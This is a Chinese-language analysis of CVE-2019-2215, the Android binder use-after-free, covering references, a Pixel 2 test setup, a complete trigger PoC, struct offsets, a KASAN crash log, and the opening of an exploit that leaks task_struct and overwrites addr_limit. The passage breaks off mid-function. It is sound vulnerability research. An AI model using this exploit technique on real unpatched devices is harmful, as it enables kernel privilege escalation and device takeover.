## CVE-2019-2215
## 信息收集
  * [360安全响应-安卓本地提权漏洞预警](https://cert.360.cn/warning/detail?id=2df10d70526adb4cc93edea85baa9985)
  * [bugs.chromium project-zero email](https://bugs.chromium.org/p/project-zero/issues/detail?id=1942)，project zero的公开邮件
  * [Project Zero博客](https://googleprojectzero.blogspot.com/2019/11/bad-binder-android-in-wild-exploit.html)，对漏洞成因和利用细节有详细说明
  * [linux各版本源码](http://elixir.bootlin.com/linux/latest/source)，用来找各变量类型间的定义比较方便，但其中对于结构体和各类定义都比较老，这部分代码参考其他来源比较好
## 复现环境
  * pixel 2
  * Android 9
  * 内核`4.4.169-gee9976dde895`
## poc
### 编译poc
  * google 下载ndk最新版本
  * 使用命令编译
        $ ndk//toolchains/llvm/prebuilt//bin/aarch64-linux-android28-clang -o poc poc.c
### poc.c
来源：
只包含main的简短的poc用于触发漏洞，展示了内核存在的漏洞点。在未补丁的系统上运行有可能导致内核崩溃
### poc2.c
来源：
利用该漏洞进行内核任意地址读写。该poc运行后的`uname -a`输出中可以看到`EXPLOITED KERNEL`
### poc3.c
来源：
利用该漏洞进行本地提权
## 漏洞分析
### 漏洞描述
    漏洞成因：使用了epoll的进程在调用BINDER_THREAD_EXIT结束binder线程时会释放binder_thread结构体，然后在程序退出或调用EPOLL_CTL_DEL时会遍历已释放结构体binder_thread中的wait链表进行链表删除操作。
    问题在于，当程序退出或调用epoll的清理操作时，此时访问的wait链表位于已释放的binder_thread结构体中，uaf产生。如果在binder_thread释放后手动申请内存占位，那么在程序访问到wait链表时就会在手动申请的内存中操作，从而泄露信息。利用这些信息可以进一步达到内核任意地址读写甚至提权等操作。
### 结构体定义和uaf过程
`binder_thread`结构体，是导致uaf的关键结构体：
    //https://android.googlesource.com/kernel/msm/+/550c01d0e051461437d6e9d72f573759e7bc5047/drivers/android/binder.c#615
    struct binder_thread {
            struct binder_proc *proc;
            struct rb_node rb_node;
            struct list_head waiting_thread_node;
            int pid;
            int looper;              /* only modified by this thread */
            bool looper_need_return; /* can be written by other thread */
            struct binder_transaction *transaction_stack;
            struct list_head todo;
            bool process_todo;
            struct binder_error return_error;
            struct binder_error reply_error;
            //uaf point (offset 0xA0)
            wait_queue_head_t wait;
            struct binder_stats stats;
            atomic_t tmp_ref;
            bool is_dead;
            //root point (offset 0x190)
            struct task_struct *task;
    };
poc.c的代码，触发漏洞的过程：
    //poc.c
    #include 
    #include 
    #include 
    #include 
    #define BINDER_THREAD_EXIT 0x40046208ul
    int main()
    {
            int fd, epfd;
            struct epoll_event event = { .events = EPOLLIN };
            fd = open("/dev/binder0", O_RDONLY);
            epfd = epoll_create(1000);
            epoll_ctl(epfd, EPOLL_CTL_ADD, fd, &event);
            ioctl(fd, BINDER_THREAD_EXIT, NULL);
    }
KASAN的crash输出（部分省略）：
    //https://bugs.chromium.org/p/project-zero/issues/attachmentText?aid=414028
    [  464.504637] c0   3033 ==================================================================
    [  464.504747] c0   3033 BUG: KASAN: use-after-free in remove_wait_queue+0x48/0x90
    [  464.511836] c0   3033 Write of size 8 at addr 0000000000000000 by task new.out/3033
    [  464.518893] c0   3033
    [  464.526548] c0   3033 CPU: 0 PID: 3033 Comm: new.out Tainted: G         C      4.4.177-ga9e0ec5cb774 #1
    [  464.529044] c0   3033 Hardware name: Qualcomm Technologies, Inc. MSM8998 v2.1 (DT)
    [  464.538334] c0   3033 Call trace:
    [  464.545928] c0   3033 [] dump_backtrace+0x0/0x34c
    [  464.549328] c0   3033 [] show_stack+0x1c/0x24
    [  464.555411] c0   3033 [] dump_stack+0xb8/0xe8
    [  464.561319] c0   3033 [] print_address_description+0x94/0x334
    [  464.567219] c0   3033 [] kasan_report+0x1f8/0x340
    [  464.574501] c0   3033 [] __asan_store8+0x74/0x90
    [  464.580753] c0   3033 [] remove_wait_queue+0x48/0x90
    [  464.587125] c0   3033 [] ep_unregister_pollwait.isra.8+0xa8/0xec
    [  464.593617] c0   3033 [] ep_free+0x74/0x11c
    [  464.601149] c0   3033 [] ep_eventpoll_release+0x34/0x48
    [  464.606988] c0   3033 [] __fput+0x10c/0x32c
    [  464.613724] c0   3033 [] ____fput+0x18/0x20
    [  464.619463] c0   3033 [] task_work_run+0xd0/0x128
    [  464.625193] c0   3033 [] do_exit+0x3e4/0x1198
    [  464.631260] c0   3033 [] do_group_exit+0x7c/0x128
    [  464.637167] c0   3033 [] __wake_up_parent+0x0/0x44
    [  464.643421] c0   3033 [] el0_svc_naked+0x24/0x28
    [  464.649944] c0   3033
    [  464.655899] c0   3033 Allocated by task 3033:
    [  464.658257]  [] save_stack_trace_tsk+0x0/0x204
    [  464.663899]  [] save_stack_trace+0x20/0x28
    [  464.669882]  [] kasan_kmalloc.part.5+0x50/0x124
    [  464.675528]  [] kasan_kmalloc+0xc4/0xe4
    [  464.681597]  [] kmem_cache_alloc_trace+0x12c/0x240
    [  464.686992]  [] binder_get_thread+0xdc/0x384
    [  464.693319]  [] binder_poll+0x34/0x1bc
    [  464.699127]  [] SyS_epoll_ctl+0x704/0xf84
    [  464.704423]  [] el0_svc_naked+0x24/0x28
    [  464.709971] c0   3033
    [  464.714124] c0   3033 Freed by task 3033:
    [  464.716396]  [] save_stack_trace_tsk+0x0/0x204
    [  464.721699]  [] save_stack_trace+0x20/0x28
    [  464.727678]  [] kasan_slab_free+0xb0/0x1c0
    [  464.733322]  [] kfree+0x8c/0x2b4
    [  464.738952]  [] binder_thread_dec_tmpref+0x15c/0x1c0
    [  464.743750]  [] binder_thread_release+0x284/0x2e0
    [  464.750253]  [] binder_ioctl+0x6f4/0x3664
    [  464.756498]  [] do_vfs_ioctl+0x7f0/0xd58
    [  464.762052]  [] SyS_ioctl+0x9c/0xc0
    [  464.767513]  [] el0_svc_naked+0x24/0x28
    ------------------------------ ... ... -----------------------------------    [  465.201706] c0   3033 Call trace:
    ------------------------------ ... ... -----------------------------------    [  465.298084] c0   3033 [] kasan_end_report+0x38/0x3c
    [  465.306712] c0   3033 [] kasan_report+0xec/0x340
    [  465.313308] c0   3033 [] __asan_store8+0x74/0x90
    [  465.319390] c0   3033 [] remove_wait_queue+0x48/0x90
    [  465.325581] c0   3033 [] ep_unregister_pollwait.isra.8+0xa8/0xec
    [  465.332075] c0   3033 [] ep_free+0x74/0x11c
    [  465.339607] c0   3033 [] ep_eventpoll_release+0x34/0x48
    [  465.345437] c0   3033 [] __fput+0x10c/0x32c
    [  465.352183] c0   3033 [] ____fput+0x18/0x20
    [  465.357920] c0   3033 [] task_work_run+0xd0/0x128
    [  465.363643] c0   3033 [] do_exit+0x3e4/0x1198
    [  465.369711] c0   3033 [] do_group_exit+0x7c/0x128
    [  465.375617] c0   3033 [] __wake_up_parent+0x0/0x44
    [  465.381882] c0   3033 [] el0_svc_naked+0x24/0x28
    [  465.388494] c0   3033 Code: f9400261 f00124e0 91000000 945d2daa (d4210000)
    [  465.394428] c0   3033 ---[ end trace 3129689a85316455 ]---
尝试根据kasan的输出寻找引发内核崩溃的一系列调用：
  * `epoll_ctl`调用后申请了`binder_thread`结构，`binder_thread`结构申请的过程在`Allocated by task`(27行)中
  * 随后在`ioctl`调用过程中释放了`binder_thread`结构体，过程在Freed by task(38行)中从`SyS_ioctl`(47行)到`kfree`(42行)
  * 目前来看程序在正常运行，但在程序结束即将退出时触发了crash，Call trace(50行)处报告了crash时的调用栈
  * 以调用顺序由下往上看，`ep_eventpoll_release`(58行)之前是系统退出时的相关调用，从`ep_eventpoll_release`往上到`remove_wait_queue`是程序结束后epoll相关的清理工作，也就是说在`remove_wait_queue`调用后导致了crash
  * `remove_wait_queue`中，参数`wq_head`就是`binder_thread`中的wait成员
        //https://code.woboq.org/linux/linux/kernel/sched/wait.c.html#39
    void remove_wait_queue(struct wait_queue_head *wq_head, struct wait_queue_entry *wq_entry)
    {
      unsigned long flags;
      spin_lock_irqsave(&wq_head->lock, flags);
      __remove_wait_queue(wq_head, wq_entry);
      spin_unlock_irqrestore(&wq_head->lock, flags);
    }
  * 由于`binder_thread`释放后，其中的成员`wait`（指向`wait_queue_head`的指针）没有删除，导致wait指向的是一片被释放的内存，所以在程序退出时调用到`remove_wait_queue`中的`spin_lock_irqsave`对wait成员的自旋锁检查时出现了错误
## 漏洞利用——任意地址写
### main
    int epfd;
    void *dummy_page_4g_aligned;
    unsigned long current_ptr;
    int binder_fd;
    int kernel_rw_pipe[2];
    int main(void) {
      printf("Starting POC\n");
      //pin_to(0);
      dummy_page_4g_aligned = mmap((void*)0x100000000UL, 0x2000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
      if (dummy_page_4g_aligned != (void*)0x100000000UL)
        err(1, "mmap 4g aligned");
      if (pipe(kernel_rw_pipe)) err(1, "kernel_rw_pipe");
      binder_fd = open("/dev/binder", O_RDONLY);
      epfd = epoll_create(1000);
      leak_task_struct();
      clobber_addr_limit();
      setbuf(stdout, NULL);
      printf("should have stable kernel R/W now\n");
     ......
    }
  * 申请了一段大小0x2000的内存，赋值给了全局变量`dummy_page_4g_aligned`。这段内存在后面构造数据时会用到，作用是绕过`spin_lock_irqsave`检查。
  * 打开`"/dev/binder"`，进行`epoll_create`操作，和poc.c中开始的操作一样，用于epoll的初始化
  * 调用`leak_task_struct`泄露`task_struct`地址
  * 调用`clobber_addr_limit`覆盖`addr_limit`实现内核任意地址读写
  * 后面的操作就是利用得到的任意地址读写能力修改系统属性
主要关注点在`leak_task_struct`和`clobber_addr_limit`这两个函数，逐个分析
### 泄露task_struct pointer
为了利用uaf，需要先用`writev`重新申请到`binder_thread`释放的空间，通过`EPOLL_CTL_DEL`调用`remove_wait_queue`将`wait`的地址泄露到之前申请的内存中。由于`task_struct`和wait都位于binder_thread中，所以计算偏移后就能得到`task_struct`的指针
  * 利用`writev`申请到内核空间
学习：[readv和writev函数](https://blog.csdn.net/weixin_36750623/article/details/84579243)
调用writev会经过`rw_copy_check_uvector`检查writev第二个参数`struct
iovec`指针中的每一项是否位于用户空间中，检查通过后会将writev第二个参数复制到内核空间，并且就算之后`iov_base`不再指向用户空间也不会再检查。利用这两个特点，可以构造iovec结构体数组的大小与`binder_thread`相同或相近，复制时就有很大可能申请到`binder_thread`释放后的那块内存，然后利用`rw_copy_check_uvector`只检查一次的特性，泄露内核地址后可以读取内核空间的数据。
  * 通过`remove_wait_queue`泄露`wait`地址
epoll在执行`EPOLL_CTL_DEL`时会调用`remove_wait_queue`清理`wait`链表，通过构造iovec结构体中的数据绕过`spin_lock_irqsave`检查后，进入到`__remove_wait_queue`函数中，相关函数如下：
        static inline void __remove_wait_queue(wait_queue_head_t *head, wait_queue_t *old)
    {
        list_del(&old->task_list);
    }
    static inline void list_del(struct list_head *entry)
    {
            __list_del(entry->prev, entry->next);
            entry->next = LIST_POISON1;
            entry->prev = LIST_POISON2;
    }
    static inline void __list_del(struct list_head * prev, struct list_head * next)
    {
            next->prev = prev;